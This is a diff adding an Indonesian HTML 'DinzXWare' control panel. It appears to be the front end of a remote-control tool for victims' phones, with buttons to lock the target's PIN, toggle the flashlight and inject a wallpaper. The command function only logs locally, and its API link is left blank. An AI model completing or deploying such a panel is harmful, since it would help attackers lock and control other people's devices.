@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DinzXWare | Cylex Control Panel</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #050505; color: #00ff41; font-family: 'Courier New', Courier, monospace; }
+        .glitch { text-shadow: 2px 2px #ff0000, -2px -2px #0000ff; animation: scan 2s infinite; }
+        @keyframes scan { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+        .card { border: 1px solid #1a1a1a; background: #0f0f0f; transition: 0.3s; }
+        .card:hover { border-color: #ff0000; box-shadow: 0 0 15px rgba(255, 0, 0, 0.5); }
+        .btn-red { background: #660000; border: 1px solid #ff0000; }
+        .btn-red:hover { background: #990000; }
+    </style>
+</head>
+<body class="p-4 md:p-8">
+
+    <div class="max-w-4xl mx-auto">
+        <div class="text-center mb-10 border-b border-red-900 pb-6">
+            <h1 class="text-4xl md:text-6xl font-bold glitch uppercase tracking-tighter">DinzXWare ☠️</h1>
+            <p class="text-gray-500 mt-2 font-bold tracking-widest">[ SYSTEM STATUS: <span class="text-red-600 animate-pulse">OVERRIDE ACTIVE</span> ]</p>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+            
+            <div class="card p-6 rounded-lg border-l-4 border-l-red-600">
+                <h3 class="text-xl font-bold mb-4 flex items-center">🔓 SECURITY BYPASS</h3>
+                <div class="flex flex-col gap-3">
+                    <button onclick="sendCmd('lock', 'true')" class="btn-red text-white py-3 rounded font-bold transition uppercase">Locked PIN Target</button>
+                    <button onclick="sendCmd('lock', 'false')" class="bg-gray-800 hover:bg-gray-700 text-white py-3 rounded font-bold transition uppercase">Unlocked PIN</button>
+                </div>
+            </div>
+
+            <div class="card p-6 rounded-lg border-l-4 border-l-yellow-500">
+                <h3 class="text-xl font-bold mb-4 flex items-center">⚡ HARDWARE HIJACK</h3>
+                <div class="flex flex-col gap-3">
+                    <button onclick="sendCmd('flashlight', 'on')" class="bg-yellow-700 hover:bg-yellow-600 text-black py-3 rounded font-bold transition uppercase font-black">Hidupkan Senter</button>
+                    <button onclick="sendCmd('flashlight', 'off')" class="bg-gray-800 hover:bg-gray-700 text-white py-3 rounded font-bold transition uppercase">Matikan Senter</button>
+                </div>
+            </div>
+
+            <div class="card p-6 rounded-lg col-span-1 md:col-span-2 border-l-4 border-l-blue-600">
+                <h3 class="text-xl font-bold mb-4">🖼️ WALLPAPER INJECTION</h3>
+                <div class="flex flex-col md:flex-row gap-3">
+                    <input id="wp_url" type="text" placeholder="Masukkan URL Gambar (JPG/PNG)..." class="flex-1 bg-black border border-gray-800 p-3 rounded text-green-500 focus:outline-none focus:border-blue-500">
+                    <button onclick="sendCmd('wallpaper', document.getElementById('wp_url').value)" class="bg-blue-700 hover:bg-blue-600 text-white px-8 py-3 rounded font-bold uppercase">Ganti Wallpaper</button>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="mt-10 card p-4 rounded bg-black border border-green-900">
+            <div class="flex justify-between mb-2 border-b border-green-900 pb-1">
+                <span class="text-xs font-bold text-green-800 uppercase">Terminal Output</span>
+                <span class="text-xs text-red-700 animate-ping">● LIVE</span>
+            </div>
+            <div id="logs" class="text-xs h-32 overflow-y-auto leading-relaxed">
+                <p class="text-gray-600">[INFO]: Menunggu koneksi dari target...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function sendCmd(task, value) {
+            const log = document.getElementById('logs');
+            const time = new Date().toLocaleTimeString();
+            
+            // Log ke layar
+            log.innerHTML += `<p class="text-green-400">[${time}] <span class="text-white">COMMAND SENT:</span> ${task.toUpperCase()} -> ${value}</p>`;
+            log.scrollTop = log.scrollHeight;
+
+            // Efek suara kalau mau (Opsional)
+            alert("Perintah " + task + " Berhasil dikirim! Target bakal mampus, 😈");
+            
+            // Link Vercel API lu nanti ditaruh di sini
+            console.log("Kirim ke API: " + task + " dengan nilai " + value);
+        }
+    </script>
+</body>
+</html>
